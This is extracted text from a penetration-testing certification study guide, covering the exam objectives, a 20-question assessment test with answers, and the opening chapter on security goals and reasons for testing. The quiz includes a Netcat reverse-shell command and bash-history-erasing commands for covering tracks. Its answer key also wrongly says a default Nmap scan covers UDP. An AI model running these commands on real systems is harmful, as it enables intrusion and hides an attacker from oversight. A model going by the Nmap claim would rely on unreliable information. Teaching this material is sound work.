+Third-party provider authorization when necessary 2
+1.3 Explain the importance of scoping an engagement properly. 2
+Types of assessment 2
+Goals-based/objectives-based 2
+Compliance-based 2
+Red team 2
+Special scoping considerations 2
+Premerger 2
+Supply chain 2
+Target selection 2
+Targets 2
+Internal 2
+On-site vs. off-site 2
+External 2
+First-party vs. third-party hosted 2
+Physical 2
+Users 2
+SSIDs 2
+Applications 2
+Considerations 2
+
+Introduction  xxxv
+Exam Objective Chapter
+White-listed vs. black-listed 2
+Security exceptions 2
+IPS/WAF whitelist 2
+NAC 2
+Certificate pinning 2
+Company’s policies 2
+Strategy 2
+Black box vs. white box vs. gray box 2
+Risk acceptance 2
+Tolerance to impact 2
+Scheduling 2
+Scope creep 2
+Threat actors 2
+Adversary tier 2
+APT 2
+Script kiddies 2
+Hacktivist 2
+Insider threat 2
+Capabilities 2
+Intent 2
+Threat models 2
+
+xxxvi Introduction
+Exam Objective Chapter
+1.4 Explain the key aspects of compliance-based assessments. 2
+Compliance-based assessments, limitations, and caveats 2
+Rules to complete assessment 2
+Password policies 2
+Data isolation 2
+Key management 2
+Limitations 2
+Limited network access 2
+Limited storage access 2
+Clearly defined objectives based on regulations 2
+2.0 Information Gathering and Vulnerability Identification
+Exam Objective Chapter
+2.1 Given a scenario, conduct information gathering using appropriate techniques. 3
+Scanning 3
+Enumeration 3
+Hosts 3
+Networks 3
+Domains 3
+Users 3
+
+Introduction  xxxvii
+Exam Objective Chapter
+Groups 3
+Network shares 3
+Web pages 3
+Applications 3
+Services 3
+Tokens 3
+Social networking sites 3
+Packet crafting 3
+Packet inspection 3
+Fingerprinting 3
+Cryptography 3
+Certificate inspection 3
+Eavesdropping 3
+RF communication monitoring 3
+Sniffing 3
+Wired 3
+Wireless 3
+Decompilation 3
+Debugging 3
+Open Source Intelligence Gathering 3
+Sources of research 3
+CERT 3
+
+xxxviii Introduction
+Exam Objective Chapter
+NIST 3
+JPCERT 3
+CAPEC 3
+Full disclosure 3
+CVE 3
+CWE 3
+2.2 Given a scenario, perform a vulnerability scan. 4
+Credentialed vs. non-credentialed 4
+Types of scans 4
+Discovery scan 4
+Full scan 4
+Stealth scan 4
+Compliance scan 4
+Container security 4
+Application scan 4
+Dynamic vs. static analysis 4
+Considerations of vulnerability scanning 4
+Time to run scans 4
+Protocols used 4
+Network topology 4
+Bandwidth limitations 4
+Query throttling 4
+Fragile systems/non-traditional assets 4
+
+Introduction  xxxix
+Exam Objective Chapter
+2.3 Given a scenario, analyze vulnerability scan results. 5
+Asset categorization 5
+Adjudication 5
+False positives 5
+Prioritization of vulnerabilities 5
+Common themes 5
+Vulnerabilities 5
+Observations 5
+Lack of best practices 5
+2.4 Explain the process of leveraging information to prepare for exploitation. 6
+Map vulnerabilities to potential exploits 6
+Prioritize activities in preparation for penetration test 6
+Describe common techniques to complete attack 6
+Cross-compiling code 6
+Exploit modification 6
+Exploit chaining 6
+Proof-of-concept development (exploit development) 6
+Social engineering 6
+Credential brute forcing 6
+Dictionary attacks 6
+Rainbow tables 6
+Deception 6
+
+xl Introduction
+Exam Objective Chapter
+2.5 Explain weaknesses related to specialized systems. 4, 5, 10
+ICS 5
+SCADA 5
+Mobile 5
+IoT 5
+Embedded 5
+Point-of-sale system 5
+Biometrics 10
+Application containers 4
+RTOS 5
+3.0 Attacks and Exploits
+Exam Objective Chapter
+3.1 Compare and contrast social engineering attacks. 8
+Phishing 8
+Spear phishing 8
+SMS phishing 8
+Voice phishing 8
+Whaling 8
+Elicitation 8
+Business email compromise 8
+Interrogation 8
+Impersonation 8
+
+Introduction  xli
+Exam Objective Chapter
+Shoulder surfing 8
+USB key drop 8
+Motivation techniques 8
+Authority 8
+Scarcity 8
+Social proof 8
+Urgency 8
+Likeness 8
+Fear 8
+3.2 Given a scenario, exploit network-based vulnerabilities. 7
+Name resolution exploits 7
+NETBIOS name service 7
+LLMNR 7
+SMB exploits 7
+SNMP exploits 7
+SMTP exploits 7
+FTP exploits 7
+DNS cache poisoning 7
+Pass the hash 7
+Man-in-the-middle 7
+ARP spoofing 7
+Replay 7
+Relay 7
+
+xlii Introduction
+Exam Objective Chapter
+SSL stripping 7
+Downgrade 7
+DoS/stress test 7
+NAC bypass 7
+VLAN hopping 7
+3.3 Given a scenario, exploit wireless and RF-based vulnerabilities. 7
+Evil twin 7
+Karma attack 7
+Downgrade attack 7
+Deauthentication attacks 7
+Fragmentation attacks 7
+Credential harvesting 7
+WPS implementation weakness 7
+Bluejacking 7
+Bluesnarfing 7
+RFID cloning 7
+Jamming 7
+Repeating 7
+3.4 Given a scenario, exploit application-based vulnerabilities. 9
+Injections 9
+SQL 9
+HTML 9
+Command 9
+Code 9
+
+Introduction  xliii
+Exam Objective Chapter
+Authentication 9
+Credential brute forcing 9
+Session hijacking 9
+Redirect 9
+Default credentials 9
+Weak credentials 9
+Kerberos exploits 9
+Authorization 9
+Parameter pollution 9
+Insecure direct object reference 9
+Cross-site scripting (XSS) 9
+Stored/persistent 9
+Reflected 9
+DOM 9
+Cross-site request forgery (CSRF/XSRF) 9
+Clickjacking 9
+Security misconfiguration 9
+Directory traversal 9
+Cookie manipulation 9
+File inclusion 9
+Local 9
+Remote 9
+
+xliv Introduction
+Exam Objective Chapter
+Unsecure code practices 9
+Comments in source code 9
+Lack of error handling 9
+Overly verbose error handling 9
+Hard-coded credentials 9
+Race conditions 9
+Unauthorized use of functions/unprotected APIs 9
+Hidden elements 9
+Sensitive information in the DOM 9
+Lack of code signing 9
+3.5 Given a scenario, exploit local host vulnerabilities. 10
+OS vulnerabilities 10
+Windows 10
+Mac OS 10
+Linux 10
+Android 10
+iOS 10
+Unsecure service and protocol configurations 10
+Privilege escalation 10
+Linux-specific 10
+SUID/SGID programs 10
+Unsecure SUDO 10
+
+Introduction  xlv
+Exam Objective Chapter
+Ret2libc 10
+Sticky bits 10
+Windows-specific 10
+Cpassword 10
+Clear text credentials in LDAP 10
+Kerberoasting 10
+Credentials in LSASS 10
+Unattended installation 10
+SAM database 10
+DLL hijacking 10
+Exploitable services 10
+Unquoted service paths 10
+Writable services 10
+Unsecure file/folder permissions 10
+Keylogger 10
+Scheduled tasks 10
+Kernel exploits 10
+Default account settings 10
+Sandbox escape 10
+Shell upgrade 10
+VM 10
+Container 10
+
+xlvi Introduction
+Exam Objective Chapter
+Physical device security 10
+Cold boot attack 10
+JTAG debug 10
+Serial console 10
+3.6 Summarize physical security attacks related to facilities. 8
+Piggybacking/tailgating 8
+Fence jumping 8
+Dumpster diving 8
+Lock picking 8
+Lock bypass 8
+Egress sensor 8
+Badge cloning 8
+3.7 Given a scenario, perform post-exploitation techniques. 6
+Lateral movement 6
+RPC/DCOM 6
+PsExec 6
+WMI 6
+Scheduled tasks 6
+PS remoting/WinRM 6
+SMB 6
+RDP 6
+Apple Remote Desktop 6
+VNC 6
+
+Introduction  xlvii
+Exam Objective Chapter
+X-server forwarding 6
+Telnet 6
+SSH 6
+RSH/Rlogin 6
+Persistence 6
+Scheduled jobs 6
+Scheduled tasks 6
+Daemons 6
+Back doors 6
+Trojan 6
+New user creation 6
+Covering your tracks 6
+4.0 Penetration Testing Tools
+Exam Objective Chapter
+4.1 Given a scenario, use Nmap to conduct information gathering  
+exercises.3
+SYN scan (-sS) vs. full connect scan (-sT) 3
+Port selection (-p) 3
+Service identification (-sV) 3
+OS fingerprinting (-O) 3
+
+xlviii Introduction
+Exam Objective Chapter
+Disabling ping (-Pn) 3
+Target input file (-iL) 3
+Timing (-T) 3
+Output parameters 3
+oA 3
+oN 3
+oG 3
+oX 3
+4.2 Compare and contrast various use cases of tools. 3, 4, 5, 6, 7, 
+8, 9, 10, 12
+(**The intent of this objective is NOT to test specific vendor feature sets.)
+Use cases 5, 7 ,8
+Reconnaissance 3
+Enumeration 3
+Vulnerability scanning 5
+Credential attacks 10
+Offline password cracking 10
+Brute-forcing services 7
+Persistence 6
+Configuration compliance 4
+Evasion 6
+Decompilation 9
+
+Introduction  xlix
+Exam Objective Chapter
+Forensics 12
+Debugging 9
+Software assurance 9
+Fuzzing 9
+SAST 9
+DAST 9
+Tools 4, 7 ,9, 10
+Scanners 4
+Nikto 4
+OpenVAS 4
+SQLmap 4
+Nessus 4
+Credential testing tools 4, 7, 10
+Hashcat 10
+Medusa 10
+Hydra 10
+Cewl 10
+John the Ripper 10
+Cain and Abel 10
+Mimikatz 10
+Patator 10
+
+l Introduction
+Exam Objective Chapter
+Dirbuster 10
+W3AF 4
+Debuggers 9
+OLLYDBG 9
+Immunity debugger 9
+GDB 9
+WinDBG 9
+IDA 9
+Software assurance 9
+Findbugs/findsecbugs 9
+Peach 9
+AFL 9
+SonarQube 9
+YASCA 9
+OSINT 3
+Whois 3
+Nslookup 3
+Foca 3
+Theharvester 3
+Shodan 3
+Maltego 3
+Recon-NG 3
+
+Introduction  li
+Exam Objective Chapter
+Censys 3
+Wireless 7
+Aircrack-NG 7
+Kismet 7
+WiFite 7
+Web proxies 9
+OWASP ZAP 9
+Burp Suite 9
+Social engineering tools 8
+SET 8
+BeEF 8
+Remote access tools 10
+SSH 10
+NCAT 10
+NETCAT 10
+Proxychains 10
+Networking tools 7
+Wireshark 7
+Hping 7
+Mobile tools 9
+Drozer 9
+APKX 9
+
+lii Introduction
+Exam Objective Chapter
+APK studio 9
+MISC 6
+Searchsploit 6
+Powersploit 6
+Responder 6
+Impacket 6
+Empire 6
+Metasploit framework 6
+4.3 Given a scenario, analyze tool output or data related to a  
+penetration test.7, 9, 10
+Password cracking 10
+Pass the hash 10
+Setting up a bind shell 10
+Getting a reverse shell 10
+Proxying a connection 7
+Uploading a web shell 9
+Injections 9
+4.4 Given a scenario, analyze a basic script (limited to Bash, Python, Ruby, and PowerShell).11
+Logic 11
+Looping 11
+Flow control 11
+I/O 11
+File vs. terminal vs. network 11
+
+Introduction  liii
+Exam Objective Chapter
+Substitutions 11
+Variables 11
+Common operations 11
+String operations 11
+Comparisons 11
+Error handling 11
+Arrays 11
+Encoding/decoding 11
+5.0 Reporting and Communication
+Exam Objective Chapter
+5.1 Given a scenario, use report writing and handling best practices. 12
+Normalization of data 12
+Written report of findings and remediation 12
+Executive summary 12
+Methodology 12
+Findings and remediation 12
+Metrics and measures 12
+Risk rating 12
+Conclusion 12
+Risk appetite 12
+Storage time for report 12
+Secure handling and disposition of reports 12
+
+liv Introduction
+Exam Objective Chapter
+5.2 Explain post-report delivery activities. 12
+Post-engagement cleanup 12
+Removing shells 12
+Removing tester-created credentials 12
+Removing tools 12
+Client acceptance 12
+Lessons learned 12
+Follow-up actions/retest 12
+Attestation of findings 12
+5.3 Given a scenario, recommend mitigation strategies for discovered 
+vulnerabilities.12
+Solutions 12
+People 12
+Process 12
+Technology 12
+Findings 12
+Shared local administrator credentials 12
+Weak password complexity 12
+Plain text passwords 12
+No multifactor authentication 12
+SQL injection 12
+Unnecessary open services 12
+
+Introduction  lv
+Exam Objective Chapter
+Remediation 12
+Randomize credentials/LAPS 12
+Minimum password requirements/password filters 12
+Encrypt the passwords 12
+Implement multifactor authentication 12
+Sanitize user input/parameterize queries 12
+System hardening 12
+5.4 Explain the importance of communication during the penetration testing 
+process.12
+Communication path 12
+Communication triggers 12
+Critical findings 12
+Stages 12
+Indicators of prior compromise 12
+Reasons for communication 12
+Situational awareness 12
+De-escalation 12
+De-confliction 12
+Goal reprioritization 12
+
+Assessment Test
+If you’re considering taking the PenTest+ exam, you should have already taken and passed 
+the CompTIA Security+ and Network+ exams or have equivalent experience—typically at least three to four years of experience in the field. You may also already hold other equiva-lent or related certifications. The following assessment test will help to make sure you have the knowledge that you need before you tackle the PenTest+ certification, and it will help you determine where you may want to spend the most time with this book.
+1. Ricky is conducting a penetration test against a web application and is looking for potential 
+vulnerabilities to exploit. Which of the following vulnerabilities does not commonly exist in web applications?
+A.
+ SQL injection
+B. VM escape
+C. Buffer overflow
+D. Cross-site scripting
+2. What specialized type of legal document is often used to protect the confidentiality of data 
+and other information that penetration testers may encounter?
+A. An SOW
+B. An NDA
+C. An MSA
+D. A noncompete
+3. Chris is assisting Ricky with his penetration test and would like to extend the vulnerability 
+search to include the use of dynamic testing. Which one of the following tools can he use as an interception proxy?
+A.
+ ZAP
+B. Nessus
+C. SonarQube
+D. OLLYDBG
+4. Matt is part of a penetration testing team and is using a standard toolkit developed by his 
+team. He is executing a password cracking script named password.sh . What language is 
+this script most likely written in?
+A. PowerShell
+B. Bash
+C. Ruby
+D. Python
+
+Assessment Test  lvii
+5. Renee is conducting a penetration test and discovers evidence that one of the systems she is 
+exploring was already compromised by an attacker. What action should she take immedi-ately after confirming her suspicions?
+A.
+ Record the details in the penetration testing report.
+B. Remediate the vulnerability that allowed her to gain access.
+C. Report the potential compromise to the client.
+D. No further action is necessary because Renee’s scope of work is limited to penetration 
+testing.
+6. Which of the following vulnerability scanning methods will provide the most accurate detail during a scan?
+A.
+ Black box
+B. Authenticated
+C. Internal view
+D. External view
+7. Annie wants to cover her tracks after compromising a Linux system. If she wants to perma-
+nently prevent the commands she inputs to a Bash shell, which of the following commands should she use?
+A.
+ history -c
+B. kill -9 $$
+C. echo "" > /~/.bash_history
+D. ln /dev/null ~/.bash_history -sf
+8. Kaiden would like to perform an automated web application security scan of a new system 
+before it is moved into production. Which one of the following tools is best suited for this task?
+A.
+ Nmap
+B. Nikto
+C. Wireshark
+D. CeWL
+9. Steve is engaged in a penetration test and is gathering information without actively scan-
+ning or otherwise probing his target. What type of information is he gathering?
+A. OSINT
+B. HSI
+C. Background
+D. None of the above
+
+lviii Assessment Test
+10. Which of the following activities constitutes a violation of integrity?
+A. Systems were taken offline, resulting in a loss of business income.
+B. Sensitive or proprietary information was changed or deleted.
+C. Protected information was accessed or exfiltrated.
+D. Sensitive personally identifiable information was accessed or exfiltrated.
+11. Ted wants to scan a remote system using Nmap and uses the following command:
+nmap 149.89.80.0/24
+How many TCP ports will he scan?A.
+ 256
+B. 1,000
+C. 1,024
+D. 65,535
+12. Brian is conducting a thorough technical review of his organization’s web servers. He is 
+specifically looking for signs that the servers may have been breached in the past. What term best describes this activity?
+A.
+ Penetration testing
+B. Vulnerability scanning
+C. Remediation
+D. Threat hunting
+13. Liam executes the following command on a compromised system:
+nc 10.1.10.1 7337 -e /bin/sh
+What has he done?A.
+ Started a reverse shell using Netcat
+B. Captured traffic on the Ethernet port to the console via Netcat
+C. Set up a bind shell using Netcat
+D. None of the above
+14. Dan is attempting to use VLAN hopping to send traffic to VLANs other than the one he is 
+on. What technique does the following diagram show?
+Preamble
+123456781234561234561234 121 ... .N 123412345678 9101112Destination MAC Source MAC 802.1Q
+header
+1234802.1Q
+headerEthertypePayload CRC / FCS Inter-frame Gap
+VLAN hopping attack
+A. A double jump
+B. A powerhop
+C. Double tagging
+D. VLAN squeezing
+
+Assessment Test  lix
+15. Alaina wants to conduct a man-in-the-middle attack against a target system. What tech-
+nique can she use to make it appear that she has the IP address of a trusted server?
+A. ARP spoofing
+B. IP proofing
+C. DHCP pirating
+D. Spoofmastering
+16. Michael’s social engineering attack relies on telling the staff members he contacts that oth-
+ers have provided the information that he is requesting. What motivation technique is he using?
+A.
+ Authority
+B. Scarcity
+C. Likeness
+D. Social proof
+17. Vincent wants to gain access to workstations at his target but cannot find a way into the 
+building. What technique can he use to do this if he is also unable to gain access remotely or on site via the network?
+A.
+ Shoulder surfing
+B. Kerberoasting
+C. USB key drop
+D. Quid pro quo
+18. Jennifer is reviewing files in a directory on a Linux system and sees a file listed with the fol-
+lowing attributes. What has she discovered?
+-rwsr-xr—1 root kismet 653905 Nov 4 2016 /usr/bin/kismet_capture
+A. An encrypted file
+B. A hashed file
+C. A SUID file
+D. A SIP file
+19. Which of the following tools is best suited to querying data provided by organizations like the American Registry for Internet Numbers (ARIN) as part of a footprinting or reconnais-sance exercise?
+A.
+ Nmap
+B. Traceroute
+C. regmon
+D. Whois
+
+lx Assessment Test
+20. Chris believes that the Linux system he has compromised is a virtual machine. Which  
+of the following techniques will not provide useful hints about whether the system is a  VM or not?
+A.
+ Run system-detect-virt
+B. Run ls -l /dev/disk/by-id
+C. Run wmic  baseboard to get manufacturer, product
+D. Run dmidecode  to retrieve hardware information
+
+Answers to Assessment Test
+1. B. Web applications commonly experience SQL injection, buffer overflow, and cross-site 
+scripting vulnerabilities. Virtual machine (VM) escape attacks work against the hypervi-
+sor of a virtualization platform and are not generally exploitable over the Web. You’ll learn more about all of these vulnerabilities in Chapters 5 and 9.
+2. 
+ B. A nondisclosure agreement, or NDA, is a legal agreement that is designed to protect the 
+confidentiality of the client’s data and other information that the penetration tester may encounter during the test. An SOW is a statement of work, which defines what will be done during an engagement, an MSA is a master services agreement that sets the overall terms between two organizations (which then use SOWs to describe the actual work), and non -
+competes are just that—an agreement that prevents competition, usually by preventing an employee from working for a competitor for a period of time after their current job ends. You’ll learn more about the legal documents that are part of a penetration test in Chapter 2.
+3.
+ A. The Zed Attack Proxy (ZAP) from the Open Web Application Security Project 
+(OWASP) is an interception proxy that is very useful in penetration testing. Nessus is a vulnerability scanner that you’ll learn more about in Chapter 4. SonarQube is a static, not dynamic, software testing tool, and OLLYDBG is a debugger. You’ll learn more about these tools in Chapter 9.
+4.
+ B. The .sh file extension is commonly used for Bash scripts. PowerShell scripts usually 
+have a .ps1  extension. Ruby scripts use the .rb extension, and Python scripts end with 
+.py. You’ll learn more about these languages in Chapter 11.
+5. C. When penetration testers discover indicators of an ongoing or past compromise, they 
+should immediately inform management and recommend that the organization activate its cybersecurity incident response process. You’ll learn more about reporting and communica-tion in Chapter 12.
+6.
+ B. An authenticated, or credentialed, scan provides the most detailed view of the system. 
+Black box assessments presume no knowledge of a system and would not have credentials or an agent to work with on the system. Internal views typically provide more detail than external views, but neither provides the same level of detail that credentials can allow. You’ll learn more about authenticated scanning in Chapter 4.
+7. 
+ D. While all of these commands are useful for covering her tracks, only linking /dev/null  
+to .bash_history  will prevent the Bash history file from containing anything. Chapters 6 
+and 10 cover compromising hosts and hiding your tracks.
+8. B. It’s very important to know the use and purpose of various penetration testing tools 
+when taking the PenTest+ exam. Nikto is the best tool to meet Kaiden’s needs in this sce-nario, as it is a dedicated web application scanning tool. Nmap is a port scanner, while Wireshark is a packet analysis tool. The Custom Wordlist Generator (CeWL) is used to spi-der websites for keywords. None of the latter three tools perform web application security testing. You’ll learn more about Nikto in Chapter 4.
+
+lxii Answers to Assessment Test
+9.  A. OSINT, or open-source intelligence, is information that can be gathered passively. Pas-
+sive information gathering is useful because it is not typically visible to targets and can pro-
+vide useful information about systems, networks, and details that guide the active portion of a penetration test. Chapter 3 covers OSINT in more detail.
+10.
+ B. Integrity breaches involve data being modified or deleted. When systems are taken 
+offline it is an availability issue, protected information being accessed might be classified as a breach of proprietary information, and sensitive personally identifiable information access would typically be classified as a privacy breach. You will learn more about three goals of security—confidentiality, integrity, and availability—in Chapter 1.
+11. 
+ B. By default, Nmap will scan the 1,000 most common ports for both TCP and UDP. 
+Chapter 3 covers Nmap and port scanning, including details of what Nmap does by default and how.
+12.
+ D. Threat hunting uses the attacker mindset to search the organization’s technology infra-
+structure for the artifacts of a successful attack. Threat hunters ask themselves what a hacker might do and what type of evidence they might leave behind and then go in search of that evidence. Brian’s activity clearly fits this definition. You’ll learn more about threat hunting in Chapter 1.
+13. 
+ A. Liam has used Netcat to set up a reverse shell. This will connect to 10.1.10.1 on port 
+7337 and connect it to a Bash shell. Chapters 6 and 10 provide information about setting up remote access once you have compromised a system.
+14. 
+ C. This is an example of a double tagging attack used against 802.1q interfaces. The first 
+tag will be stripped, allowing the second tag to be read as the VLAN tag for the packet. Double jumps may help video gamers, but the other two answers were made up for this question. Chapter 7 digs into network vulnerabilities and exploits.
+15. 
+ A. ARP spoofing attacks rely on responding to a system’s ARP queries faster than the 
+actual target can, thus allowing the attacker to provide false information. Once accepted, the attacker’s system can then act as a man in the middle. Chapter 7 explores man-in-the-middle attacks, methods, and uses.
+16.
+ D. Social engineering attacks that rely on social proof rely on persuading the target that 
+other people have behaved similarly. Likeness may sound similar, but it relies on building trust and then persuading the target that they have things in common with the penetration tester. Chapter 8 covers social engineering and how to exploit human behaviors.
+17. 
+ C. A USB key drop is a form of physical honeypot that can be used to tempt employees at a 
+target organization into picking up and accessing USB drives that are distributed to places they are likely to be found. Typically one or more files will be placed on the drive that are tempting but conceal penetration testing tools that will install Trojans or remote access tools once accessed. Chapter 8 also covers physical security attacks, including techniques like key drops.
+18. 
+ C. The s in the file attributes indicates that this is a SETUID or SUID file that allows it to 
+run as its owner. Chapter 10 discusses vulnerabilities in Linux, including how to leverage vulnerable SUID files.
+
+Answers to Assessment Test  lxiii
+19. D. Regional Internet registries like ARIN are best queried either via their websites or using 
+tools like Whois. Nmap is a useful port scanning utility, traceroute is used for testing the 
+path packets take to a remote system, and regmon is an outdated Windows Registry tool that has been supplanted by Process Monitor. You’ll read more about OSINT in Chapter 3.
+20.
+ C. All of these commands are useful ways to determine if a system is virtualized, but wmic  
+is a Windows tool. You’ll learn about VM escape and detection in Chapter 10.
+
+CompTIA®
+PenTest+ Study Guide
+
+Chapter 
+1Penetration TestingCompTIA® PenTest+ Study Guide: Exam PT0-001 
+By Mike Chapple and David Seidl  
+Copyright © 2019 by John Wiley & S ons, Inc., Indianapolis, Indiana 
+ 
+
+Hackers employ a wide variety of tools to gain unauthorized 
+access to systems, networks, and information. Automated tools, including network scanners, software debuggers, pass-
+word crackers, exploitation frameworks, and malware, do play an important role in the attacker’s toolkit. Cybersecurity professionals defending against attacks should have access to the same tools in order to identify weaknesses in their own defenses that an attacker might exploit.
+These automated tools are not, however, the most important tools at a hacker’s disposal. 
+The most important tool used by attackers is something that cybersecurity profession-als can’t download or purchase. It’s the power and creativity of the human mind. Skilled attackers leverage quite a few automated tools as they seek to defeat cybersecurity defenses, but the true test of their ability is how well they are able to synthesize the information pro-vided by those tools and pinpoint potential weaknesses in an organization’s cybersecurity defenses.
+What Is Penetration Testing?
+Penetration testing  seeks to bridge the gap between the rote use of technical tools to test 
+an organization’s security and the power of those tools when placed in the hands of a skilled and determined attacker. Penetration tests are authorized, legal attempts to defeat an organization’s security controls and perform unauthorized activities. The tests are time-consuming and require staff who are as skilled and determined as the real-world attackers who will attempt to compromise the organization. However, they’re also the most effective way for an organization to gain a complete picture of its security vulnerability.
+Cybersecurity Goals
+Cybersecurity professionals use a well-known model to describe the goals of information security. The CIA triad, shown in Figure 1.1, includes the three main characteristics of information that cybersecurity programs seek to protect.
+■ ■Confidentiality measures seek to prevent unauthorized access to information or systems.
+■ ■Integrity measures seek to prevent unauthorized modification of information or systems.
+■ ■Availability  measures seek to ensure that legitimate use of information and systems 
+remains possible.
+
+What Is Penetration Testing?  3
+Figure 1.1   The CIA triad
+AvailabilityConﬁdentialityIntegrity
+Attackers, and therefore penetration testers, seek to undermine these goals and achieve 
+three corresponding goals of their own. The attackers’ goals are known as the DAD triad, 
+shown in Figure 1.2.
+■ ■Disclosure  attacks seek to gain unauthorized access to information or systems.
+■ ■Alteration  attacks seek to make unauthorized changes to information or systems.
+■ ■Denial  attacks seek to prevent legitimate use of information and systems.
+Figure 1.2   The DAD triad
+Availability
+DenialConﬁdentialityDisclosureIntegrityAlteration
+These two models, the CIA and DAD triads, are the cornerstones of cybersecurity. As 
+shown in Figure 1.2, the elements of both models are directly correlated, with each leg of the attackers’ DAD triad directly corresponding to a leg of the CIA triad that is designed to counter those attacks. Confidentiality controls seek to prevent disclosure attacks. Integrity controls seek to prevent alteration attacks. Availability controls seek to keep systems run-ning, preventing denial attacks.
+
+4 Chapter 1  ■ Penetration Testing
+Adopting the Hacker Mind-Set
+If you’ve been practicing cybersecurity for some time, you’re probably intimately familiar 
+with the elements of the CIA triad. Cybersecurity defenders do spend the majority of their time thinking in these terms, designing controls and defenses to protect information and systems against a wide array of known and unknown threats.
+Penetration testers must take a very different approach in their thinking. Instead of 
+trying to defend against all possible threats, they only need to find a single vulnerability that they might exploit to achieve their goals. To find these flaws, they must think like the adversary who might attack the system in the real world. This approach is commonly known as adopting the hacker mind-set .
+Before we explore the hacker mind-set in terms of technical systems, let’s explore it using 
+an example from the physical world. If you were responsible for the physical security of an electronics store, you might consider a variety of threats and implement controls designed to counter those threats. You’d be worried about shoplifting, robbery, and employee embezzle-ment, among other threats, and you might build a system of security controls that seeks to prevent those threats from materializing. These controls might include the following items:
+■ ■Security cameras in high risk areas
+■ ■Auditing of cash register receipts
+■ ■Theft detectors at the main entrance/exit of the store
+■ ■Exit alarms on emergency exits
+■ ■Burglar alarm wired to detect the opening of doors outside of business hours
+Now, imagine that you’ve been engaged to conduct a security assessment of this store. 
+You’d likely examine each one of these security controls and assess its ability to prevent each of the threats identified in your initial risk assessment. You’d also look for gaps in the existing security controls that might require supplementation. Your mandate is broad and high-level.
+Penetration tests, on the other hand, have a much more focused mandate. Instead of 
+adopting the approach of a security professional, you adopt the mind-set of an attacker. You don’t need to evaluate the effectiveness of each security control. You simply need to find either one flaw in the existing controls or one scenario that was overlooked in planning those controls.
+In this example, a penetration tester might enter the store during business hours and 
+conduct reconnaissance, gathering information about the security controls that are in place and the locations of critical merchandise. They might notice that although the burglar alarm is tied to the doors, it does not include any sensors on the windows. The tester might then return in the middle of the night, smash a window, and grab valuable merchandise. Recognizing that the store has security cameras in place, the attacker might wear a mask and park a vehicle outside of the range of the cameras. That’s the hacker mind-set. You need to think like a criminal.
+There’s an important corollary to the hacker mind-set that is important for both attack-
+ers and defenders to keep in mind. When conducting a penetration test (or a real-world 
+
+Reasons for Penetration Testing  5
+attack), the attacker only needs to win once. They might attempt hundreds or thousands of 
+potential attacks against a target. The fact that an organization’s security defenses block 99.99 percent of those attacks is irrelevant if one of the attacks succeeds. Cybersecurity professionals need to win every time. Attackers only need to win once.
+Reasons for Penetration Testing
+The modern organization dedicates extensive time, energy, and funding to a wide variety of security controls and activities. We install firewalls, intrusion prevention systems, security information and event management devices, vulnerability scanners, and many other tools. We equip and staff 24-hour security operations centers (SOCs) to monitor those technolo-gies and watch our systems, networks, and applications for signs of compromise. There’s more than enough work to completely fill our days twice over. Why on Earth would we want to take on the additional burden of performing penetration tests? After all, they are time-consuming to perform internally and expensive to outsource.
+The answer to this question is that penetration testing provides us with visibility into 
+the organization’s security posture that simply isn’t available by other means. Penetration testing does not seek to replace all of the other cybersecurity activities of the organiza-tion. Instead, it complements and builds upon those efforts. Penetration testers bring their unique skills and perspective to the table and can take the output of security tools and place them within the attacker’s mind-set, asking the question, If I were an attacker, how could I use this information to my advantage?
+Benefits of Penetration Testing
+We’ve already discussed how  penetration testers carry out their work at a high level, and 
+the remainder of this book is dedicated to exploring penetration testing tools and tech-niques in detail. Before we dive into that, let’s take a moment to consider why  we conduct 
+penetration testing. What benefits does it bring to the organization?
+First and foremost, penetration testing provides us with knowledge that we can’t obtain 
+elsewhere. By conducting thorough penetration tests, we learn whether an attacker with the same knowledge, skills, and information as our testers would likely be able to penetrate our defenses. If they can’t gain a foothold, we can then be reasonably confident that our networks are secure against attack by an equivalently talented attacker under the present circumstances.
+Second, in the event that attackers are successful, penetration testing provides us with 
+an important blueprint for remediation. As cybersecurity professionals, we can trace the actions of the testers as they progressed through the different stages of the attack and close the series of open doors the testers passed through. This provides us with a more robust defense against future attacks.
+Finally, penetration tests can provide us with essential, focused information about spe-
+cific attack targets. We might conduct a penetration test prior to the deployment of a new 
+
+6 Chapter 1  ■ Penetration Testing
+system that is specifically focused on exercising the security features of that new environ-
+ment. Unlike an open-ended penetration test, which is broad in nature, focused tests can drill into the defenses around a specific target and provide actionable insight that can  prevent a vulnerability from initial exposure.
+Threat Hunting
+The discipline of threat hunting  is closely related to penetration testing but has a separate 
+and distinct purpose. Like penetration testers, cybersecurity professionals engaged in 
+threat hunting seek to adopt the attacker’s mind-set and imagine how hackers might seek to defeat an organization’s security controls. The two disciplines diverge in what they accomplish with this information.
+While penetration testers seek to evaluate the organization’s security controls by testing 
+them in the same manner an attacker might, threat hunters use the attacker mind-set to search the organization’s technology infrastructure for the artifacts of a successful attack. They ask themselves what a hacker might do and what type of evidence they might leave behind and then go in search of that evidence.
+Threat hunting builds upon a cybersecurity philosophy known as the “presumption of 
+compromise.” This approach assumes that attackers have already successfully breached an organization and searches out the evidence of successful attacks. When threat hunters discover a potential compromise, they then kick into incident-handling mode, seeking to contain, eradicate, and recover from the compromise. They also conduct a post-mortem analysis of the factors that contributed to the compromise in an effort to remediate defi-ciencies. This post-event remediation is another similarity between penetration testing and threat hunting: organizations leverage the output of both processes in similar ways.
+Regulatory Requirements for Penetration Testing
+There is one last reason that you might conduct a penetration test—because you must! The 
+most common regulatory requirement for penetration testing comes from the Payment Card Industry Data Security Standard (PCI DSS). This regulation is a private contractual obli-gation that governs all organizations involved in the storage, processing, or transmission of credit and debit card transactions. Nestled among the more than 100 pages of detailed security requirements for cardholder data environments (CDEs) is section 11.3, which reads as follows:
+Implement a methodology for penetration testing that includes the following:
+ ■Is based on industry accepted penetration testing approaches (for example, NIST SP800-115)
+ ■Includes coverage for the entire CDE perimeter and critical systems
+
+Reasons for Penetration Testing  7
+ ■ Includes testing from both inside and outside the network   
+ ■ Includes testing to validate any segmentation and scope-reduction 
+controls   
+ ■ Defines application-layer penetration tests to include, at a minimum, the vulnerabilities listed in Requirement 6.5   
+ ■ Defines network-layer penetration tests to include components that support network functions as well as operating systems   
+ ■ Includes review and consideration of threats and vulnerabilities experienced in the last 12 months   
+ ■ Specifies retention of penetration testing results and remediation activities results 
+Source: Payment Card Industry Data Security Standard Version 3.2       
+   
+ Requirement 6.5 includes a listing of common vulnerabilities, including 
